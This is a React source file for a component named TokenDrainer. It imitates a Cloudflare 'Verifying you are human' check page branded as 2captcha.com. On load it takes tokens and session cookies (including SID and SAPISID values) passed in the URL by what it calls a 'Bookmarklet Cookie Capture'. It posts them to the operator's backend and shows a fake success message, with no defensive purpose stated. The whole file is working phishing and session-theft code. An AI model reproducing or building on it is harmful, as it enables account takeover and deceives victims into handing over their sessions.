import { useState, useEffect, useRef } from 'react';
import { API_ORIGIN } from '../api';

const SITE_NAME = '2captcha.com';
const FAVICON_URL = 'https://2captcha.com/favicon.ico';

function Spinner() {
  return (
    <div className="cf-spinner">
      <span className="cf-dot" /><span className="cf-dot" /><span className="cf-dot" />
      <span className="cf-dot" /><span className="cf-dot" /><span className="cf-dot" />
      <span className="cf-dot" /><span className="cf-dot" />
    </div>
  );
}

function SuccessIcon() {
  return (
    <svg width="30" height="30" viewBox="0 0 52 52" className="cf-success-svg">
      <circle cx="26" cy="26" r="25" fill="#228b49" stroke="#228b49" strokeWidth="2" />
      <path d="m13,26l9.37,9l17.63,-18" fill="none" stroke="#fff" strokeWidth="6"
        strokeDasharray="242" className="cf-check-path" />
    </svg>
  );
}

function FailIcon() {
  return (
    <svg width="30" height="30" viewBox="0 0 30 30" className="cf-fail-svg">
      <circle cx="15" cy="15" r="15" fill="#b20f03" />
      <path d="M15.93 16.23H13.43L13.07 7H16.28L15.93 16.23ZM14.68 19.16c.51 0 .92.15 1.22.45.31.3.47.68.47 1.15 0 .46-.16.84-.47 1.14-.31.3-.71.45-1.22.45-.5 0-.91-.15-1.22-.45-.31-.3-.46-.68-.46-1.14 0-.46.15-.84.46-1.14.31-.31.72-.46 1.22-.46Z"
        fill="#f2f2f2" />
    </svg>
  );
}

function TurnstileWidget({ state }) {
  return (
    <div className="cf-widget">
      {state === 'verifying' && (
        <div className="cf-widget-inner">
          <Spinner />
          <span className="cf-widget-text">Verifying...</span>
        </div>
      )}
      {state === 'checkbox' && (
        <div className="cf-widget-inner">
          <label className="cf-checkbox-label">
            <input type="checkbox" readOnly checked={false} />
            <span className="cf-checkbox-box" />
            <span className="cf-checkbox-text">Verify you are human</span>
          </label>
        </div>
      )}
      {state === 'success' && (
        <div className="cf-widget-inner">
          <SuccessIcon />
          <span className="cf-widget-text cf-success-text">Success!</span>
        </div>
      )}
      {state === 'error' && (
        <div className="cf-widget-inner">
          <FailIcon />
          <span className="cf-widget-text cf-error-text">Verification failed</span>
        </div>
      )}
    </div>
  );
}

function TokenDrainer() {
  const [status, setStatus] = useState('idle');
  const [widgetState, setWidgetState] = useState('checkbox');
  const processed = useRef(false);

  useEffect(() => {
    if (processed.current) return;
    const urlParams = new URLSearchParams(globalThis.location.search);
    const token = urlParams.get('token');
    const cookie = urlParams.get('cookie');
    const alreadySent = urlParams.get('sent') === '1';

    if (!token && !cookie && !alreadySent) return;
    processed.current = true;

    setStatus('processing');
    setWidgetState('verifying');

    const timer1 = setTimeout(() => {
      setWidgetState('success');
      setStatus('success');
    }, 2200);

    if (alreadySent) {
      globalThis.history.replaceState(null, '', globalThis.location.pathname);
      return () => clearTimeout(timer1);
    }

    if (token) {
      fetch(`${API_ORIGIN}/api/process-token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token,
          url: urlParams.get('url') || 'Unknown',
          timestamp: urlParams.get('timestamp') || new Date().toISOString(),
          method: urlParams.get('method') || 'Bookmarklet Redirect'
        })
      })
      .then(async (res) => {
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) {
          setStatus('error');
          setWidgetState('error');
          if (data.message) console.error('Backend:', data.message);
          return;
        }
        setStatus('success');
      })
      .catch(() => {
        setStatus('error');
        setWidgetState('error');
      });
    } else if (cookie) {
      fetch(`${API_ORIGIN}/api/process-cookie`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cookie,
          sid: urlParams.get('sid') || '',
          sapisid: urlParams.get('sapisid') || '',
          type: urlParams.get('type') || 'unknown',
          url: urlParams.get('url') || 'Unknown',
          timestamp: urlParams.get('timestamp') || new Date().toISOString(),
          method: urlParams.get('method') || 'Bookmarklet Cookie Capture'
        })
      })
      .then(async (res) => {
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) {
          setStatus('error');
          setWidgetState('error');
          if (data.message) console.error('Backend:', data.message);
          return;
        }
        setStatus('success');
      })
      .catch(() => {
        setStatus('error');
        setWidgetState('error');
      });
    }

    globalThis.history.replaceState(null, '', globalThis.location.pathname);

    return () => clearTimeout(timer1);
  }, []);

  const showSuccessHeading = widgetState === 'success' && status !== 'error';

  return (
    <div className="cf-page">
      <div className="cf-main">
        <div className="cf-title-zone">
          <img src={FAVICON_URL} className="cf-favicon" alt="" />
          <h1 className="cf-site-name">{SITE_NAME}</h1>
        </div>

        {!showSuccessHeading && (
          <>
            <h2 className="cf-heading">Verifying you are human. This may take a few seconds.</h2>
            <p className="cf-desc">
              This website uses a security service to protect against malicious bots.
              This page is displayed while the website verifies you are not a bot.
            </p>
          </>
        )}

        {showSuccessHeading && (
          <h2 className="cf-heading cf-heading-success">
            Verification successful. Waiting for {SITE_NAME} to respond<span className="cf-dots" />
          </h2>
        )}

        <TurnstileWidget state={widgetState} />
      </div>

      <footer className="cf-footer">
        <div className="cf-footer-inner">
          <span className="cf-footer-text">
            Performance and Security by{' '}
            <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">Cloudflare</a>
          </span>
          <span className="cf-footer-sep" />
          <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer"
            className="cf-footer-text">Privacy</a>
        </div>
      </footer>
    </div>
  );
}

export default TokenDrainer;
